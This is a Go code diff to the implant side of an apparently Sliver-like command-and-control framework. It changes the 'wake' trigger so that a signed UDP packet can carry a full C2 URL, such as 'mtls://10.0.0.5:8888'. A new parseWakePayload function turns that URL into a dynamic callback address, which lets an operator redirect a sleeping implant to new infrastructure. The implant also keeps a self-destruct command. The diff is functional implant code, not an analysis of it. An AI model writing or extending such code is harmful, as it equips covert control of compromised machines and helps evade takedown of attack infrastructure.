@@ -21,7 +21,7 @@ package triggerwake
 	listener (which dispatches into operator-configurable handlers),
 	this implant-side variant has a FIXED, hardcoded task set:
 
-	  "wake"          -> transports.WakeNow()  (short-circuits beacon sleep)
+	  "wake"          -> transports.WakeNow(info)  (short-circuits beacon sleep)
 	  "self-destruct" -> burn.Now()            (initiates self-destruct)
 
 	The task set is fixed by design: the implant runs in hostile
@@ -50,6 +50,7 @@ import (
 	"crypto/sha256"
 	"encoding/hex"
 	"net"
+	"net/url"
 	"os/exec"
 	"strings"
 	"sync"
@@ -246,12 +247,23 @@ func handlePacket(payload []byte, remote *net.UDPAddr, cfg *Config, replay *repl
 	// Dispatch to fixed task set.
 	switch msg.Intent {
 	case "wake":
+		// Payload format (backward compatible):
+		//   ""                         -> no preference, use baked-in C2 list
+		//   "mtls"                     -> transport hint only, use baked-in C2 list
+		//   "mtls://10.0.0.5:8888"     -> dynamic callback: connect to this address
+		//
+		// When the payload contains "://", it's a full C2 URL specifying a
+		// dynamic callback target. The scheme is extracted as the transport
+		// hint, and the full URL is passed as a temporary C2 override. This
+		// allows the operator to specify the callback address at wake time
+		// rather than at build time — useful for dynamic infrastructure.
+		// Security: the payload is covered by the HMAC signature, so only
+		// an operator with the shared secret can set the callback target.
+		info := parseWakePayload(msg.Payload)
 		// {{if .Config.Debug}}
-		log.Printf("[triggerwake] wake triggered by %s (transport=%q)", msg.ClientID, msg.Payload)
+		log.Printf("[triggerwake] wake triggered by %s (transport=%q callback=%q)", msg.ClientID, info.TransportHint, info.CallbackURL)
 		// {{end}}
-		// Payload carries the operator's preferred C2 transport scheme
-		// (e.g. "mtls", "wg", "http", "dns"). Empty = try all.
-		transports.WakeNow(msg.Payload)
+		transports.WakeNow(info)
 	case "self-destruct":
 		// {{if .Config.Debug}}
 		log.Printf("[triggerwake] self-destruct triggered by %s", msg.ClientID)
@@ -500,6 +512,37 @@ var (
 type simpleError string
 
 func (e simpleError) Error() string { return string(e) }
+
+// parseWakePayload extracts transport hint and optional dynamic callback
+// URL from the wake trigger's payload field. Format:
+//
+//	""                       -> WakeInfo{}  (no preference)
+//	"mtls"                   -> WakeInfo{TransportHint: "mtls"}
+//	"mtls://10.0.0.5:8888"  -> WakeInfo{TransportHint: "mtls", CallbackURL: "mtls://10.0.0.5:8888"}
+//
+// The presence of "://" distinguishes a full callback URL from a bare
+// transport hint. For URLs, the scheme doubles as the transport hint.
+func parseWakePayload(payload string) transports.WakeInfo {
+	payload = strings.TrimSpace(payload)
+	if payload == "" {
+		return transports.WakeInfo{}
+	}
+
+	// If it contains "://", treat as a full C2 callback URL.
+	if strings.Contains(payload, "://") {
+		u, err := url.Parse(payload)
+		if err == nil && u.Scheme != "" && u.Host != "" {
+			return transports.WakeInfo{
+				TransportHint: u.Scheme,
+				CallbackURL:   payload,
+			}
+		}
+		// Malformed URL — fall through to treat as plain hint.
+	}
+
+	// Plain transport hint (backward compatible).
+	return transports.WakeInfo{TransportHint: payload}
+}
 
 // Forward references to keep imports clean.
 var (
